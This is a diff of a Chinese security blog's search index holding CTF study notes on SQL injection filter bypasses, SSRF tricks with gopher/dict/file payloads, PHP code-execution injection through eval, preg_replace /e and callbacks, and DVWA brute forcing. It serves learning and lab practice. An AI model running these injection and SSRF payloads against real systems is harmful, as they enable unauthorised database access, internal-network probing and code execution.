+    <content><![CDATA[<h4 id="CTF-SQL注入基础"><a href="#CTF-SQL注入基础" class="headerlink" title="CTF-SQL注入基础"></a>CTF-SQL注入基础</h4><h4 id="万能密码："><a href="#万能密码：" class="headerlink" title="万能密码："></a>万能密码：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p><strong>主要是逻辑or，返回true，密码正确。</strong></p>
+<ul>
+<li>burp需要使用+或%20代替空格</li>
+</ul>
+<p><strong>sql注入类型：数字型、字符串类型</strong></p>
+<ul>
+<li>sql语句中的括号不代表实际意义，主要用于优先级处理。</li>
+</ul>
+<p><strong>sql注入可能存在的位置：</strong></p>
+<p>1、URL提交参数，GET型</p>
+<p>2、HTTP请求主体，POST型</p>
+<p>3、请求头(cookie,user-agent,referer)</p>
+<p><strong>sql注入利用</strong></p>
+<p>1、获取数据库信息</p>
+<p>2、获取系统命令执行shell</p>
+<p>3、上传、下载服务器文件(webshell)等</p>
+<p><strong>技法：</strong></p>
+<p><strong>联合注入、布尔盲注、延时注入、报错注入、堆叠注入、宽字节注入、二次注入、无列名注入等等。</strong></p>
+<h4 id="CTF-SQL注入技巧"><a href="#CTF-SQL注入技巧" class="headerlink" title="CTF-SQL注入技巧"></a>CTF-SQL注入技巧</h4><p>url中字符的特殊含义：</p>
+<p>1、&amp;表示get提交参数的分隔符，如果sql注入中将and替换成&amp;&amp;，要对&amp;进行URL编码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;-&gt;%26%26</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2、#表示锚点，点击当前的链接会跳转到当前页面的某个位置，sql注入需要对#进行URL编码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#-&gt;%23</span><br></pre></td></tr></table></figure>
+
+
+
+<p>3、web站点默认访问index开头的页面，可以省略index.php</p>
+<p>4、web站点默认端口使用80端口，可省略。若非80端口，不可省略。</p>
+<p>绕过过滤姿势</p>
+<p><em>1、常用注释符</em></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--空格</span><br><span class="line">--+</span><br><span class="line">/*注释*/</span><br><span class="line">在mysql中是多行注释 但是如果里面加了! 那么后面的内容会被执	行</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
+
+<p><em>2、大小写绕过</em></p>
+<p><em>3、双写绕过</em></p>
+<p><em>4、内联注释绕过</em></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=1 union /*!select*/ 1,2,3;</span><br><span class="line">加了感叹号，select会被执行。</span><br></pre></td></tr></table></figure>
+
+<p><em>5、单引号过滤</em></p>
+<ul>
+<li>十六进制绕过</li>
+<li>char函数绕过</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char(ascii)+char(ascii)+char(ascii)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><em>6、空格过滤</em></p>
+<ul>
+<li>括号绕过</li>
+</ul>
+<p>遵循查什么，从哪里，符合条件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select(id)from(users)where(id=1)</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>注释符绕过空格</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空格-&gt;/**/</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>反引号绕过</li>
+</ul>
+<p>由于数据库默认识别关键字，不需要加引号，但是无法自动识别用户定义的表名和字段名，此时使用反引号指定。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select*from`users`where`id`=1</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>其他空白字符</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ascii table：</span><br><span class="line"># TAB水平 09 url编码 %09</span><br><span class="line"># 新行  0A %0A</span><br><span class="line"># 新页  0C %0C</span><br><span class="line"># 回车  0D %0D</span><br><span class="line"># TAB垂直 0B        %0B</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><em>7、等号过滤</em></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like或rlike</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">between and</span><br><span class="line">select * from users where id between 1 and 1</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">regexp代替=</span><br></pre></td></tr></table></figure>
+
+
+
+<p><em>8、逗号绕过</em></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr(&#x27;users&#x27;,1,1)=</span><br><span class="line">select substr(&#x27;users&#x27; from 1 for 1)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users limit 0,1</span><br><span class="line">select * from users limit 1 offset 0;</span><br><span class="line">第一个参数不为0,从1开始</span><br><span class="line">第二个参数为偏移量</span><br></pre></td></tr></table></figure>
+
+
+
+<p><em>9、过滤了运算比较符号</em></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">greatest(n1,n2,n3..)返回最大值</span><br><span class="line"></span><br><span class="line">greatest(ascii(substr(database(),1,1)),1)=97;</span><br><span class="line"></span><br><span class="line">least(n1,n2,n3..)返回最小值</span><br><span class="line"></span><br><span class="line">strcmp(str1,str2)</span><br><span class="line">所有字符串相等返回0,小于返回-1,大于返回1</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="约束注入"><a href="#约束注入" class="headerlink" title="约束注入"></a>约束注入</h4><p>一般注入点存在注册的时候，对于管理员密码的任意修改</p>
+<p>关键函数varchar()，当sql语句语句超过varchar定于的最大长度，并且没有唯一键约束。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin                           x</span><br></pre></td></tr></table></figure>
+
+
+
+<p>SQL语句设置和取消唯一键约束：</p>
+<p>取消唯一键</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table admin drop unique username</span><br></pre></td></tr></table></figure>
+
+<p>设置唯一键</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table admin add unique (username)</span><br></pre></td></tr></table></figure>
+
+]]></content>
       <tags>
         <tag>CTF</tag>
       </tags>
@@ -826,68 +735,88 @@
       </tags>
   </entry>
   <entry>
-    <title>CTF-代码执行</title>
-    <url>/2021/05/21/CTF-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
-    <content><![CDATA[<h2 id="代码执行介绍"><a href="#代码执行介绍" class="headerlink" title="代码执行介绍"></a>代码执行介绍</h2><p>五类相关函数</p>
-<p>1、eval+assert函数</p>
-<p>2、preg_replace/e最新php不支持，php5广泛使用</p>
-<p>3、用户自定义函数</p>
-<p>4、动态函数</p>
-<p>5、其他</p>
+    <title>CTF-SSRF</title>
+    <url>/2021/05/25/CTF-SSRF/</url>
+    <content><![CDATA[<h1 id="CTF-SSRF"><a href="#CTF-SSRF" class="headerlink" title="CTF-SSRF"></a>CTF-SSRF</h1><h3 id="SSRF介绍与简单介绍"><a href="#SSRF介绍与简单介绍" class="headerlink" title="SSRF介绍与简单介绍"></a>SSRF介绍与简单介绍</h3><p>原理：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器请求伪造是一种由web服务器发出请求的漏洞，它能够请求到与它相连的内网资源。因此SSRF主要测试目标是企业的内网系统。</span><br></pre></td></tr></table></figure>
+
 <span id="more"></span>
 
-<p>1、</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(php4 php5 php7)--把字符串作为php代码执行，当用户可以控制字符串内容，那么此时存在代码注入漏洞。</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	eval(&#x27;phpinfo;&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line">eval执行的代码必须加分号，不然会报错。</span><br><span class="line">assert类似，但是兼容性更强，字符串中可不加分号，但是php7.1以上已经废弃assert</span><br></pre></td></tr></table></figure>
-
-
-
-<p>安全人员防御：加引号</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	eval(&quot;\$ret=strtolower(&#x27;$cmd&#x27;);&quot;)//将字符串转为小写，反斜杠转义$,为了不当做变量处理</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>绕过姿势：</p>
-<p>闭合+注释</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;);phpinfo();//注释掉后面的内容</span><br><span class="line">传入变成</span><br><span class="line">$ret=strtolower(&#x27;&#x27;);phpinfo();//</span><br></pre></td></tr></table></figure>
-
-<p>如果安全人员开启了GPC将无法绕过</p>
-<p>因为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;会变成\&#x27;</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在php5之前，magic_quotes_gpc默认开启，但是在php的cookies中，如果有单引号将会被反斜杠转义，现在差不多淘汰，一般使用stripslashes函数转义</span><br><span class="line">传入1&#x27;直接变成\&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">很多web应用提供从其他服务器获取数据的功能，可根据用户提交URL访问对应资源(获取图片，下载文件，读取内容等)。</span><br><span class="line">如果该功能作为代理通道去访问本地或远程服务器，这就是所谓的SSRF。</span><br></pre></td></tr></table></figure>
 
 
 
 
 
-<p>2、</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_place</span><br><span class="line">存在危险修饰符/e</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	preg_place(&quot;/abc/e&quot;,$_REQUEST[&#x27;cmd&#x27;],&quot;abc&quot;)</span><br><span class="line">?&gt;</span><br><span class="line">这里匹配到了abc可直接执行传入的内容。</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	preg_place(&#x27;/&lt;data&gt;(.*)&lt;\/data&gt;/e&#x27;,&#x27;$ret=&quot;\\1&quot;;&#x27;,$cmd)//反斜杠转义/，说明是字符串的内容。</span><br><span class="line">	echo $ret;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">传入</span><br><span class="line">?cmd=&lt;data&gt;&#123;$&#123;phpinfo()&#125;&#125;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>3、自定义函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可构造特殊字符串传递给该函数执行任意命令。</span><br><span class="line">&lt;?php</span><br><span class="line">	$func=create_function(&#x27;&#x27;,$_REQUEST[&#x27;cmd&#x27;]);</span><br><span class="line">	$func();</span><br><span class="line">?&gt;</span><br><span class="line">第一个为参数，第二个为代码。</span><br></pre></td></tr></table></figure>
-
-
-
-<p>4、动态函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function a()&#123;</span><br><span class="line">	echo &#x27;a&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	if(isset($_GET[&quot;func&quot;]))&#123;</span><br><span class="line">		$myfunc=$_GET[&quot;func&quot;]</span><br><span class="line">		$myfunc();</span><br><span class="line">	&#125;</span><br><span class="line">传入?func=phpinfo	</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">传入</span><br><span class="line">?a=assert&amp;b=phpinfo()</span><br></pre></td></tr></table></figure>
-
-
-
-<p>用户自定义函数回调</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func(&#x27;assert&#x27;,$_GET[&#x27;cmd&#x27;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用is_callable函数来确定某函数是否可回调</span><br><span class="line">输出1表示可，没输出不可。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">传递数组类型</span><br><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	$arrar[0]=$cmd;</span><br><span class="line">	call_user_func_array(&#x27;assert&#x27;,$array);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">如果代码没有转为数组，我们可以直接传入数组</span><br><span class="line"></span><br><span class="line">?cmd[]=phpinfo()</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	$array1=array($cmd);</span><br><span class="line">	$func=$_GET[&#x27;func&#x27;];</span><br><span class="line">	array_filter($array,$func)</span><br><span class="line">?&gt;</span><br><span class="line">这个函数不同于上面，这里参数在前，函数在后。</span><br><span class="line"></span><br><span class="line">php5.6以上</span><br><span class="line">sort</span><br><span class="line">usort($_GET)</span><br><span class="line"></span><br><span class="line">?1[]=phpinfo()&amp;1[]=123&amp;2=assert()</span><br></pre></td></tr></table></figure>
+<h4 id="SSRF可能造成的危害"><a href="#SSRF可能造成的危害" class="headerlink" title="SSRF可能造成的危害"></a>SSRF可能造成的危害</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、对内网进行信息探测-端口扫描</span><br><span class="line">2、对内网服务区进行漏洞扫描利用</span><br><span class="line">3、对内网web的应用进行安全测试，如Structs、Sql注入漏洞利用。</span><br><span class="line">4、对内网中的文件读取(file协议)</span><br><span class="line">5、在PHP环境中，如果搭建expect扩展，可能被命令执行。</span><br></pre></td></tr></table></figure>
 
 
 
 
 
-<p>5、其他</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;php代码&#125;</span><br><span class="line">&lt;?php</span><br><span class="line">	$&#123;php代码&#125;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line">$func=$&#123;phpinfo()&#125;;</span><br><span class="line">$func();</span><br></pre></td></tr></table></figure>
+<h4 id="SSRF-漏洞-常用函数"><a href="#SSRF-漏洞-常用函数" class="headerlink" title="SSRF 漏洞 常用函数"></a>SSRF 漏洞 常用函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、file_get_contents</span><br><span class="line">PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)</span><br><span class="line">-将整个文件读入一个字符串。</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、fsockopen函数</span><br><span class="line">(PHP 4, PHP 5, PHP 7, PHP 8)</span><br><span class="line">-打开一个网络连接或者一个Unix套接字连接</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl函数</span><br><span class="line">参考文档：https://www.php.net/manual/zh/book.curl.php</span><br><span class="line">PHP支持Daniel Stenberg创建的libcurl库，能够连接通讯各种服务器、使用各种协议。libcurl目前支持的协议有http、https、ftp、gopher、telnet、dict、file、ldap。libcurl同时支持HTTPS证书，HTTP POST、HTTP PUT、FTP上传(也能通过PHP的FTP扩展完成)、HTTP基于表单上传、代理、cookies、用户名+密码的认证。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="SSRF绕过限制姿势"><a href="#SSRF绕过限制姿势" class="headerlink" title="SSRF绕过限制姿势"></a>SSRF绕过限制姿势</h3><h4 id="1、添加端口"><a href="#1、添加端口" class="headerlink" title="1、添加端口"></a>1、添加端口</h4><p>HTTP请求URL中默认以80端口。</p>
+<h4 id="2、短网址"><a href="#2、短网址" class="headerlink" title="2、短网址"></a>2、短网址</h4><p><a href="https://sina.lt/">https://sina.lt/</a></p>
+<h4 id="3、指定任意IP的域名xip-io"><a href="#3、指定任意IP的域名xip-io" class="headerlink" title="3、指定任意IP的域名xip.io"></a>3、指定任意IP的域名xip.io</h4><p><a href="https://xip.io/">https://xip.io/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1.xip.io</span><br><span class="line">www.127.0.0.1.xip.io</span><br><span class="line">mysite.127.0.0.1.xip.io</span><br><span class="line">foo.bar.127.0.0.1.xip.io</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="4、数制绕过"><a href="#4、数制绕过" class="headerlink" title="4、数制绕过"></a>4、数制绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IP地址是32位二进制数-&gt;4个字节</span><br><span class="line">目前看到的IP地址都是采用点分十进制组成的。</span><br><span class="line">127.0.0.1 -&gt;  01111111.00000000.00000000.00000001</span><br><span class="line">转化为十进制 -&gt; 2130706433</span><br><span class="line">八进制-&gt; 0177.00.00.01</span><br><span class="line">十六进制 -&gt; 0x7f.0x0.0x0.0x1</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="5、-跳转"><a href="#5、-跳转" class="headerlink" title="5、@跳转"></a>5、@跳转</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在URL中使用@可跳转到指定的URL</span><br><span class="line">http://www.baidu.com@127.0.0.1</span><br><span class="line">变成http://127.0.0.1</span><br><span class="line">https://www.baidu.com@127.0.0.1</span><br><span class="line">变成https://127.0.0.1</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="SSRF可用协议"><a href="#SSRF可用协议" class="headerlink" title="SSRF可用协议"></a>SSRF可用协议</h3><h4 id="1、file协议"><a href="#1、file协议" class="headerlink" title="1、file协议"></a>1、file协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file：//文件路径</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2、dict协议"><a href="#2、dict协议" class="headerlink" title="2、dict协议"></a>2、dict协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用dict协议可探测端口的开放情况和指纹信息</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令格式：</span><br><span class="line">dict://serverip:port/info</span><br><span class="line">dict://127.0.0.1:80/info</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3、gopher协议"><a href="#3、gopher协议" class="headerlink" title="3、gopher协议"></a>3、gopher协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gopher是internet上非常有名的信息查找系统，它将internet的文件组织成某种索引，很方便从internet的一处带到另一处。在www出现之前，Gopher是internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但是www出现之后，Gopher地位受到打击。Gopher协议在SSRF可以是一个万能协议，可进行GET、POST请求发送。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>构造Gopher数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">抓包后将整个数据包的</span><br><span class="line">空格替换成%20</span><br><span class="line">问好替换成%3f</span><br><span class="line">回车换行替换成%0d%0a</span><br><span class="line">最后一行也需要%0d%0a</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>gopher GET请求</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl gopher://ip:端口/_数据</span><br><span class="line"></span><br><span class="line">如</span><br><span class="line">curl gopher://127.0.0.1:端口/_GET%20/..../?a=...%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0a</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>gopher POST请求</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">与get请求类似，但是需要传入更多的相关信息。</span><br><span class="line">必须有</span><br><span class="line"></span><br><span class="line">POST /.../ HTTP/1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length:9</span><br><span class="line"></span><br><span class="line">a=xxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">最终变成</span><br><span class="line">curl gopher://_POST%20/.../%20HTTP/1.1%0d%0aHost:%20xxx%0d0aContent-Type:%20application/x-www-form-urlencoded%0d0aContent-Length%209%0d0a%0d0aa=xxx%0d%0a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">特别注意 POST有两个换号位置。</span><br><span class="line">%0d%0a%0d%0a</span><br></pre></td></tr></table></figure>
 
 
 
@@ -1037,19 +966,74 @@
       </tags>
   </entry>
   <entry>
-    <title>Brute Force</title>
-    <url>/2021/01/10/Force/</url>
-    <content><![CDATA[<h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p>即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一。</p>
+    <title>CTF-代码执行</title>
+    <url>/2021/05/21/CTF-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[<h2 id="代码执行介绍"><a href="#代码执行介绍" class="headerlink" title="代码执行介绍"></a>代码执行介绍</h2><p>五类相关函数</p>
+<p>1、eval+assert函数</p>
+<p>2、preg_replace/e最新php不支持，php5广泛使用</p>
+<p>3、用户自定义函数</p>
+<p>4、动态函数</p>
+<p>5、其他</p>
 <span id="more"></span>
 
-<ul>
-<li>low<br>查看源码，可以发现，服务器只是验证参数login是否设置，<br>isset函数在服务器中检测变量是否被设置，返回true/false，没有任何防爆机制，且存在sql注入。<br>方法一(sql注入)：在username框输入admin’# 或者 admin’ or ‘1’=’1即可成功登陆。<br>原理为 and的优先级高于or。<br>方法二(burp爆破)抓包下来，放到intruder爆破，只对参数password进行爆破，<br><img src="/2021/01/10/Force/1.png"><br>换到payload，再添加字典，最后开始attack。<br><img src="/2021/01/10/Force/2.png"><br>成功爆破，返回页面长度和其他不一样的。<br><img src="/2021/01/10/Force/3.png"></li>
-<li>medium<br>可以看到，medium级别的代码对用户输入的参数进行了简单的过滤，对一些预定义字符进行了转义，基本上防止了SQL注入。<br>还有一个措施就是如果密码输错了，则延时两秒之后才能再次提交。<br>用burp爆破与low操作一样，只是少了sql注入。</li>
-<li>high<br>使用了Anti-CSRF token来抵御CSRF攻击，使用了函数stripslashes和mysqli_real_esacpe_string来抵御sql注入和xss攻击。<br>由于使用了Anti-CSRF token，每次服务器返回登陆页面都会包含一个随机的user_token值，每次用户登陆要一起提交，<br>所以服务器接到请求，会先检查user_token值，再进行sql查询，所以使用不再使用burp的无脑爆破。<br>这里有两种方法：<br>方法一：写python脚本，先模拟服务器发出请求获得一个token值，再利用获得的token值进行爆破。(脚本后续补上)<br>方法二：还是可以使用burp爆破，需要修改一些设置。<br><img src="/2021/01/10/Force/4.png">参加两个爆破参数。<br>这里攻击类型也要相应修改，为pitchfock，线程设为1。<br>找到Grep-Extract模块进行相应设置，add：</li>
-</ul>
+<p>1、</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(php4 php5 php7)--把字符串作为php代码执行，当用户可以控制字符串内容，那么此时存在代码注入漏洞。</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	eval(&#x27;phpinfo;&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line">eval执行的代码必须加分号，不然会报错。</span><br><span class="line">assert类似，但是兼容性更强，字符串中可不加分号，但是php7.1以上已经废弃assert</span><br></pre></td></tr></table></figure>
+
+
+
+<p>安全人员防御：加引号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	eval(&quot;\$ret=strtolower(&#x27;$cmd&#x27;);&quot;)//将字符串转为小写，反斜杠转义$,为了不当做变量处理</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>绕过姿势：</p>
+<p>闭合+注释</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;);phpinfo();//注释掉后面的内容</span><br><span class="line">传入变成</span><br><span class="line">$ret=strtolower(&#x27;&#x27;);phpinfo();//</span><br></pre></td></tr></table></figure>
+
+<p>如果安全人员开启了GPC将无法绕过</p>
+<p>因为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;会变成\&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在php5之前，magic_quotes_gpc默认开启，但是在php的cookies中，如果有单引号将会被反斜杠转义，现在差不多淘汰，一般使用stripslashes函数转义</span><br><span class="line">传入1&#x27;直接变成\&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>2、</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_place</span><br><span class="line">存在危险修饰符/e</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	preg_place(&quot;/abc/e&quot;,$_REQUEST[&#x27;cmd&#x27;],&quot;abc&quot;)</span><br><span class="line">?&gt;</span><br><span class="line">这里匹配到了abc可直接执行传入的内容。</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	preg_place(&#x27;/&lt;data&gt;(.*)&lt;\/data&gt;/e&#x27;,&#x27;$ret=&quot;\\1&quot;;&#x27;,$cmd)//反斜杠转义/，说明是字符串的内容。</span><br><span class="line">	echo $ret;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">传入</span><br><span class="line">?cmd=&lt;data&gt;&#123;$&#123;phpinfo()&#125;&#125;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>3、自定义函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可构造特殊字符串传递给该函数执行任意命令。</span><br><span class="line">&lt;?php</span><br><span class="line">	$func=create_function(&#x27;&#x27;,$_REQUEST[&#x27;cmd&#x27;]);</span><br><span class="line">	$func();</span><br><span class="line">?&gt;</span><br><span class="line">第一个为参数，第二个为代码。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>4、动态函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function a()&#123;</span><br><span class="line">	echo &#x27;a&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	if(isset($_GET[&quot;func&quot;]))&#123;</span><br><span class="line">		$myfunc=$_GET[&quot;func&quot;]</span><br><span class="line">		$myfunc();</span><br><span class="line">	&#125;</span><br><span class="line">传入?func=phpinfo	</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">传入</span><br><span class="line">?a=assert&amp;b=phpinfo()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>用户自定义函数回调</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func(&#x27;assert&#x27;,$_GET[&#x27;cmd&#x27;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用is_callable函数来确定某函数是否可回调</span><br><span class="line">输出1表示可，没输出不可。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">传递数组类型</span><br><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	$arrar[0]=$cmd;</span><br><span class="line">	call_user_func_array(&#x27;assert&#x27;,$array);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">如果代码没有转为数组，我们可以直接传入数组</span><br><span class="line"></span><br><span class="line">?cmd[]=phpinfo()</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	$array1=array($cmd);</span><br><span class="line">	$func=$_GET[&#x27;func&#x27;];</span><br><span class="line">	array_filter($array,$func)</span><br><span class="line">?&gt;</span><br><span class="line">这个函数不同于上面，这里参数在前，函数在后。</span><br><span class="line"></span><br><span class="line">php5.6以上</span><br><span class="line">sort</span><br><span class="line">usort($_GET)</span><br><span class="line"></span><br><span class="line">?1[]=phpinfo()&amp;1[]=123&amp;2=assert()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>5、其他</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;php代码&#125;</span><br><span class="line">&lt;?php</span><br><span class="line">	$&#123;php代码&#125;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line">$func=$&#123;phpinfo()&#125;;</span><br><span class="line">$func();</span><br></pre></td></tr></table></figure>
+
+
+
 ]]></content>
       <tags>
-        <tag>暴力破解</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -1108,6 +1092,61 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sess_abc</span><br></pre></td></tr></table></figure>
 
 <p>直到生成shell.php。</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux-基础知识</title>
+    <url>/2021/05/25/Linux-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
